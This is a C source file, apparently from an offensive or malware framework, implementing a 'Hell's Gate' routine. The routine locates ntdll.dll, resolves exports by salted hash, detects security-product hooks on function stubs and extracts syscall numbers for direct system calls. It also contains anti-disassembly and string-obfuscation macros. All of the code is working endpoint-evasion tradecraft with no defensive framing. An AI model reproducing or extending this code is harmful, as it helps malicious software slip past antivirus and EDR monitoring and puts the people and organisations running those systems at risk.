#include "7layers.h"
#include "syscall/syscall.h"
#include "scanner.h"
#include "crypto/crypto.h"

SYSCALL_STATUS get_ssn_hell_gate(DJB2_HASH* hash, DWORD* ssn) {
    ANTI_DISASM();
    if (ssn == NULL || hash == NULL) { return SYSCALL_INVALID_PARAMETER; }
    PE_CONTEXT* curr = g_PE_HEAD;
    *ssn = 0;

    while (curr) {
        const char* target = OBF("ntdll.dll");
        size_t target_size = c_strlen(target);
        size_t scan_size = c_strlen(curr->name);
        if (target_size != scan_size|| c_memcmp(curr->name, target, scan_size) != 0) {
            PE_CONTEXT* next = curr->NextEntry;
            curr = next;
            continue;
        }
        IMAGE_EXPORT_DIRECTORY* eat = curr->export;
        if (eat == NULL) {
            return SYSCALL_UNKNOWN_ERROR;
        }

        DWORD*  AddressOfFunctions      = (DWORD*)(curr->image + eat->AddressOfFunctions);
        DWORD*  AddressOfNames          = (DWORD*)(curr->image + eat->AddressOfNames);
        WORD*   AddressOfNameOrdinales  = (WORD*)(curr->image + eat->AddressOfNameOrdinals);

        for (int i=0; i < (int)eat->NumberOfNames; i++) {
            if (AddressOfNameOrdinales[i] >= eat->NumberOfFunctions) {
                return SYSCALL_INVALID_PE_CONTEXT;
            }
            char* funcName = (char*)(curr->image + AddressOfNames[i]);
            void* funcAddr = (void*)(curr->image + AddressOfFunctions[AddressOfNameOrdinales[i]]);

            if (djb2_hash((unsigned char*)funcName, hash->salt) == hash->hash) {
                int stub = c_memcmp(funcAddr, (unsigned char*)"\x4C\x8B\xD1\xB8", 4);
                int hook = c_memcmp(funcAddr, (unsigned char*)"\xE9", 1);
                
                if (hook == 0) {
                    return SYSCALL_FUNCTION_HOOKED;
                }

                if (stub != 0) {
                    return SYSCALL_SSN_NOT_FOUND;
                }
                
                BYTE high = *((PBYTE)funcAddr + 5);
				BYTE low = *((PBYTE)funcAddr + 4);
                *ssn = (high << 8) | low;
                return SYSCALL_SSN_FOUND;
            }
        }

        return SYSCALL_FUNCTION_NOT_FOUND;
    }

    return SYSCALL_MODULE_NOT_FOUND;
}